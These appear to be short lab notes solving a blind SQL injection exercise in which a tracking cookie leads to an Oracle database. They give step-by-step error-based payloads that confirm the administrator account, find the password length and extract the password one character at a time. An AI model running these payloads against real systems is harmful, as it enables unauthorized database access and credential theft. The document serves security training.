When we send a quotation mark, it send a error. 
![[Pasted image 20250627211814.png]]

But if we put ''(two quotation mark). We receive a 200 ok. So, the error that trigger the message is a syntax mistake.

![[Pasted image 20250627211949.png]]

![[Pasted image 20250627212207.png]]

![[Pasted image 20250627212236.png]]
![[Pasted image 20250627212335.png]]
6 `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
7 `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
8 `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

Its using the case to determine if the username "adminsitrator" exist. Because, if exist it is going to trigger the error 1/0.
9 `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Determining how long is the password. When the error disappears is when we get the length
10 `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Finally, it is the final query to guess the pass. We need to change the position (password 1,1  -> password 2,1) or we can create a sequence.
11 `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`